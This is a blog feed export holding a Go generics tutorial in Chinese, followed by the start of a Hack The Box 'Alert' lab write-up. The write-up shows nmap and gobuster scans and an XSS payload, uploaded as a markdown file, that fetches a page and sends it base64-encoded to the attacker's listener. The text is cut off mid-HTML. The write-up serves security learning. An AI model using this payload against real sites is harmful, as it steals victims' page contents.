class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;<br></code></pre></td></tr></table></figure><p>泛型哈希表，键的类型必须可比较，使用 <code>comparable</code> 接口，值的类型约束为 <code>V int | string | byte</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> GenericMap[K comparable,V <span class="hljs-type">int</span> | <span class="hljs-type">string</span> | <span class="hljs-type">byte</span>] <span class="hljs-keyword">map</span>[K]V<br></code></pre></td></tr></table></figure><p>使用如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> GenericMap[K comparable, V <span class="hljs-type">int</span> | <span class="hljs-type">string</span> | <span class="hljs-type">byte</span>] <span class="hljs-keyword">map</span>[K]V<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> gmap1 = GenericMap[<span class="hljs-type">int</span>, <span class="hljs-type">string</span>]&#123;<span class="hljs-number">1</span>: <span class="hljs-string">&quot;sad&quot;</span>&#125;<br><span class="hljs-keyword">var</span> gmap2 = <span class="hljs-built_in">make</span>(GenericMap[<span class="hljs-type">string</span>, <span class="hljs-type">byte</span>], <span class="hljs-number">0</span>)<br><br>fmt.Println(gmap1)<br>fmt.Printf(<span class="hljs-string">&quot;gmap2: %#v\n&quot;</span>, gmap2)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[<span class="hljs-number">1</span>:sad]<br>gmap2: main.GenericMap[<span class="hljs-type">string</span>,<span class="hljs-type">uint8</span>]&#123;&#125;<br></code></pre></td></tr></table></figure><p>泛型结构体，约束类型为 <code>T int | string</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> GenericStruct[T <span class="hljs-type">int</span> | <span class="hljs-type">string</span>] <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>Id   T<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SayAble</code> 是一个泛型接口，<code>Person</code> 实现了该接口</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SayAble[T <span class="hljs-type">int</span> | <span class="hljs-type">string</span>] <span class="hljs-keyword">interface</span> &#123;<br>Say() T<br>&#125;<br><span class="hljs-keyword">type</span> Person[T <span class="hljs-type">int</span> | <span class="hljs-type">string</span>] <span class="hljs-keyword">struct</span> &#123;<br>msg T<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person[T])</span></span> Say() T &#123;<br><span class="hljs-keyword">return</span> p.msg<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> s SayAble[<span class="hljs-type">string</span>]<br>s = Person[<span class="hljs-type">string</span>]&#123;<span class="hljs-string">&quot;sad&quot;</span>&#125;<br>fmt.Println(s.Say())<br>&#125;<br>&gt;&gt; sad<br></code></pre></td></tr></table></figure><h2 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h2><p>泛型接口</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PrintObj</span>[<span class="hljs-title">T</span> <span class="hljs-title">fmt</span>.<span class="hljs-title">Stringer</span>]<span class="hljs-params">(s T)</span></span> &#123;<br>fmt.Println(s.String())<br>&#125;<br><br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> String() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Sprintf(<span class="hljs-string">&quot;Person: %s&quot;</span>, p.Name)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>PrintObj(Person&#123;Name: <span class="hljs-string">&quot;butt3rf1y&quot;</span>&#125;)<br>&#125;<br>&gt;&gt;<br>Person: butt3rf1y<br></code></pre></td></tr></table></figure><p>非泛型接口也能作为泛型的类型形参</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Write</span>[<span class="hljs-title">W</span> <span class="hljs-title">io</span>.<span class="hljs-title">Writer</span>]<span class="hljs-params">(w W, bs []<span class="hljs-type">byte</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> w.Write(bs)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="泛型断言"><a href="#泛型断言" class="headerlink" title="泛型断言"></a>泛型断言</h2><p>类型断言是将接口类型的变量转换为具体类型</p><p>可以用泛型来对 <code>any</code> 类型进行类型断言</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Assert</span>[<span class="hljs-title">T</span> <span class="hljs-title">any</span>]<span class="hljs-params">(v any)</span></span> (<span class="hljs-type">bool</span>, T) &#123;<br><span class="hljs-keyword">var</span> av T<br><span class="hljs-keyword">if</span> v == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, av<br>&#125;<br>av, ok := v.(T)<br><span class="hljs-keyword">return</span> ok, av<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="类型集"><a href="#类型集" class="headerlink" title="类型集"></a>类型集</h2><p>type set 只能用于泛型中的类型约束，不能做类型声明，类型断言。</p><h3 id="并集"><a href="#并集" class="headerlink" title="并集"></a>并集</h3><p>接口类型 <code>SignedInt</code> 是一个类型集，有符号整数类型的并集就是 <code>SignedInt</code> ，所以 <code>SignedInt</code> 就是她们的超集</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SignedInt <span class="hljs-keyword">interface</span> &#123;<br>   <span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span><br>&#125;<br></code></pre></td></tr></table></figure><p>其他通用接口也是这样</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SignedInt <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span><br>&#125;<br><span class="hljs-keyword">type</span> UnSignedInt <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span><br>&#125;<br><span class="hljs-keyword">type</span> Integer <span class="hljs-keyword">interface</span> &#123;<br>SignedInt | UnSignedInt<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="交集"><a href="#交集" class="headerlink" title="交集"></a>交集</h3><p>显而易见交集为 <code>SignedInt</code>，并且因为 <code>Do[uint](2)</code> 类型为 <code>uint</code> 所以无法通过编译，只有交集中才能通过编译</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SignedInt <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span><br>&#125;<br><span class="hljs-keyword">type</span> Integer <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span> | <span class="hljs-type">uint8</span> | <span class="hljs-type">uint16</span> | <span class="hljs-type">uint</span> | <span class="hljs-type">uint32</span> | <span class="hljs-type">uint64</span><br>&#125;<br><span class="hljs-keyword">type</span> Number <span class="hljs-keyword">interface</span> &#123;<br>SignedInt<br>Integer<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Do</span>[<span class="hljs-title">T</span> <span class="hljs-title">Number</span>]<span class="hljs-params">(n T)</span></span> T &#123;<br><span class="hljs-keyword">return</span> n<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>Do[<span class="hljs-type">int</span>](<span class="hljs-number">2</span>)<br>Do[<span class="hljs-type">uint</span>](<span class="hljs-number">2</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="空集"><a href="#空集" class="headerlink" title="空集"></a>空集</h3><p>像下面这样，空集就是没有交集</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SignedInt <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span><br>&#125;<br><span class="hljs-keyword">type</span> UnsignedInt <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">uint8</span> | <span class="hljs-type">uint16</span> | <span class="hljs-type">uint</span> | <span class="hljs-type">uint32</span> | <span class="hljs-type">uint64</span><br>&#125;<br><span class="hljs-keyword">type</span> Integer <span class="hljs-keyword">interface</span> &#123;<br>SignedInt<br>UnsignedInt<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="底层类型"><a href="#底层类型" class="headerlink" title="底层类型"></a>底层类型</h3><p><code>type</code> 关键字声明新类型时，其底层类型即使包含在类型集内，传入时也不能通过编译</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Int <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span> | <span class="hljs-type">uint8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">uint</span> | <span class="hljs-type">uint32</span> | <span class="hljs-type">uint64</span><br>&#125;<br><span class="hljs-keyword">type</span> TinyInt <span class="hljs-type">int8</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Do</span>[<span class="hljs-title">T</span> <span class="hljs-title">Int</span>]<span class="hljs-params">(n T)</span></span> &#123;<br><span class="hljs-keyword">return</span> n<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>Do[TinyInt](<span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>在类型前加上 <code>~</code> 表示底层类型，如果一个类型的底层类型属于该类型集，那么该类型就属于类型集。这样就能通过编译了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Int <span class="hljs-keyword">interface</span> &#123;<br>~<span class="hljs-type">int8</span> | ~<span class="hljs-type">int16</span> | ~<span class="hljs-type">int</span> | ~<span class="hljs-type">int32</span> | ~<span class="hljs-type">int64</span> | ~<span class="hljs-type">uint8</span> | ~<span class="hljs-type">uint16</span> | ~<span class="hljs-type">uint</span> | ~<span class="hljs-type">uint32</span> | ~<span class="hljs-type">uint64</span><br>&#125;<br><span class="hljs-keyword">type</span> TinyInt <span class="hljs-type">int8</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Do</span>[<span class="hljs-title">T</span> <span class="hljs-title">Int</span>]<span class="hljs-params">(n T)</span></span> T &#123;<br><span class="hljs-keyword">return</span> n<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>Do[TinyInt](<span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="泛型的使用"><a href="#泛型的使用" class="headerlink" title="泛型的使用"></a>泛型的使用</h2><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>队列中的元素是任意的，所以类型约束为 <code>any</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Queue[T any] []T<br></code></pre></td></tr></table></figure><p>总共有四个方法 <code>Pop</code>，<code>Peek</code>，<code>Push</code>，<code>Size</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Queen[T any] []T<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(q *Queen[T])</span></span> Push(e T) &#123;<br>*q = <span class="hljs-built_in">append</span>(*q, e)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(q *Queen[T])</span></span> Pop(e T) (_ T) &#123;<br><span class="hljs-keyword">if</span> q.Size() &gt; <span class="hljs-number">0</span> &#123;<br>res := q.Peek()<br>*q = (*q)[<span class="hljs-number">1</span>:]<br><span class="hljs-keyword">return</span> res<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(q *Queen[T])</span></span> Peek() (_ T) &#123;<br><span class="hljs-keyword">if</span> q.Size() &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> (*q)[<span class="hljs-number">0</span>]<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(q *Queen[T])</span></span> Size() <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(*q)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Pop</code>  和 <code>Peek</code> 方法中返回值是 <code>_T</code> ，表示泛型零值，当队列为空时，需要返回零值，但不知道类型不能返回具体类型，所以返回泛型零值。对于泛型变量，默认的值就是该类型的零值</p><h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p>堆的元素必须是可排序的类型，内置的可排序类型只有数字和字符串，初始化时需要传入一个自定义的比较器，比较器必须使用泛型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Comparator[T any] <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(a, b T)</span></span> <span class="hljs-type">int</span><br></code></pre></td></tr></table></figure><h3 id="对象池"><a href="#对象池" class="headerlink" title="对象池"></a>对象池</h3><p>复用 <code>*bytes.Buffer</code> 对象</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bytes&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPool</span>[<span class="hljs-title">T</span> <span class="hljs-title">any</span>]<span class="hljs-params">(newFn <span class="hljs-keyword">func</span>()</span></span> T) *Pool[T] &#123;<br><span class="hljs-keyword">return</span> &amp;Pool[T]&#123;<br>pool: &amp;sync.Pool&#123;<br>New: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-keyword">interface</span>&#123;&#125; &#123;<br><span class="hljs-keyword">return</span> newFn()<br>&#125;,<br>&#125;,<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">type</span> Pool[T any] <span class="hljs-keyword">struct</span> &#123;<br>pool *sync.Pool<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Pool[T])</span></span> Put(v T) &#123;<br>p.pool.Put(v)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Pool[T])</span></span> Get() T &#123;<br><span class="hljs-keyword">var</span> v T<br>get := p.pool.Get()<br><span class="hljs-keyword">if</span> get != <span class="hljs-literal">nil</span> &#123;<br>v, _ = get.(T)<br>&#125;<br><span class="hljs-keyword">return</span> v<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>bufferPool := NewPool(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> *bytes.Buffer &#123;<br><span class="hljs-keyword">return</span> bytes.NewBuffer(<span class="hljs-literal">nil</span>)<br>&#125;)<br><br><span class="hljs-keyword">for</span> <span class="hljs-keyword">range</span> <span class="hljs-number">5</span> &#123;<br>buffer := bufferPool.Get()<br>buffer.WriteString(<span class="hljs-string">&quot;sad&quot;</span>)<br>fmt.Println(buffer.String())<br>buffer.Reset()<br>bufferPool.Put(buffer)<br>&#125;<br>&#125;<br>&gt;&gt;<br>sad<br>sad<br>sad<br>sad<br>sad<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Alert</title>
    <link href="/2025/03/23/HTB-Alert/"/>
    <url>/2025/03/23/HTB-Alert/</url>
    
    <content type="html"><![CDATA[<p>XSS</p><span id="more"></span><h1 id="Submit-User-Flag"><a href="#Submit-User-Flag" class="headerlink" title="Submit User Flag"></a>Submit User Flag</h1><p>先扫</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# nmap -sS -sV -A -Pn 10.10.11.44<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-23 14:53 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.44<br>Host is up (0.35s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)<br>|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)<br>|_  256 cb:92:ad:6b:<span class="hljs-built_in">fc</span>:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-title: Did not follow redirect to http://alert.htb/<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94SVN%E=4%D=3/23%OT=22%CT=1%CU=39522%PV=Y%DS=3%DC=T%G=Y%TM=67DF<br>OS:B016%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)<br>OS:OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53A<br>OS:ST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)<br>OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%<br>OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T<br>OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=<br>OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF<br>OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=7FA%RUD=G)IE(R=Y%DFI=N%T=<br>OS:40%CD=S)<br><br>Network Distance: 3 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port 443/tcp)<br>HOP RTT       ADDRESS<br>1   0.27 ms   172.30.144.1<br>2   298.79 ms 10.10.16.1<br>3   368.82 ms 10.10.11.44<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 55.07 seconds<br></code></pre></td></tr></table></figure><p>访问 web 网页发现是一个文件上传，只能上传 md 文件，上传一个带有 xss 的文件，能成功执行 xss</p><p>扫一下目录有几个 php 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://alert.htb  -x php,.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/7e86d1c0f62c38d9.png"></p><p>上传之后点击 <code>Share Markdown</code> 将生成的 URL 在 <code>Contact Us</code> 板块进行发送</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://alert.htb/index.php&quot;</span>)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">resp</span> =&gt;</span> resp.<span class="hljs-title function_">text</span>())<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> &#123;<br>            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`http://10.10.16.15:1234/?text=<span class="hljs-subst">$&#123;btoa(text)&#125;</span>`</span>);<br>        &#125;)<br>        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> &#123;<br>            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`http://10.10.16.15:1234/?err=<span class="hljs-subst">$&#123;err&#125;</span>`</span>);<br>        &#125;);<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>上传之后点击 <code>Share Markdown</code> 将生成的 URL 在 <code>Contact Us</code> 板块进行发送</p><p><img src="https://img.dkdun.cn/v1/2025/12/9ef075b6f0fd21b5.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/831fe72fbafec063.png"></p><p>启动监听</p><p><img src="https://img.dkdun.cn/v1/2025/12/ee5b913233e2c638.png"></p><p>解码得到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span 